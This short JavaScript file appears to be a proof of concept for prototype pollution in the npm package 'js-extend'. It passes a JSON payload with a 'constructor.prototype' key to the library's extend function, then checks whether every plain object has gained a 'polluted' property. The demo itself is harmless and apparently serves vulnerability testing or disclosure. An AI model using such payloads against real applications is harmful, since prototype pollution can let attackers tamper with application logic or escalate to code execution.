var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const jsExtend = require('js-extend');
const malicious_payload = '{"constructor.prototype": {"polluted":"yes"}}';
jsExtend.extend(obj, JSON.parse(malicious_payload));
console.log({}.polluted);